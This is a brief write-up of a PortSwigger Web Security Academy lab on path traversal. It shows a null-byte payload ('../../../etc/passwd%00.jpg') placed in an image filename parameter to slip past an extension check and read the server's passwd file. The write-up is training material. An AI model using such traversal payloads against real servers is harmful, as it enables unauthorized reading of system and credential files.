# [File path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)

**detailed document about path traversal [here](?file=portswigger/basic/path-traversal)**

> bypass the extension requirement

- best option is null byte `%00` like `/etc/passwd%00.png`

- open a product image in a new tab:

`https://xxx.web-security-academy.net/image?filename=44.jpg`

- change the filename value to

`https://xxx.web-security-academy.net/image?filename=../../../etc/passwd%00.jpg`

- check the response and change the view it to utf-8, it will have the content of a passwd file
